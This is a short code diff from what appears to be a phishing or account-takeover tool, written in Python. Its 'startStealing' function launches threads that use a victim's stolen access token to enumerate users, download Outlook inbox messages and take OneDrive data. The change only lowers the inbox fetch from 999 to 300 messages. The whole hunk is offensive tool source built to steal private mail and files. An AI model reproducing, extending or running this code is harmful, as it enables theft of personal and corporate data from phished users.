@@ -351,7 +351,7 @@ def startStealing(uuid, username):
             threading.Thread(target=stealing.listusers, args=(uuid, accessToken, username)).start()
 
         if config.outlook == "checked" or config.stealAll == "checked":            
-            threading.Thread(target=stealing.outlook, args=(uuid, accessToken, username, "/me/mailfolders/inbox/messages?$top=999")).start()
+            threading.Thread(target=stealing.outlook, args=(uuid, accessToken, username, "/me/mailfolders/inbox/messages?$top=300")).start()
 
         if config.oneDrive == "checked" or config.stealAll == "checked":
             threading.Thread(target=stealing.oneDrive, args=(uuid, accessToken, username, getDefaultPhishingConfig(uuid))).start()
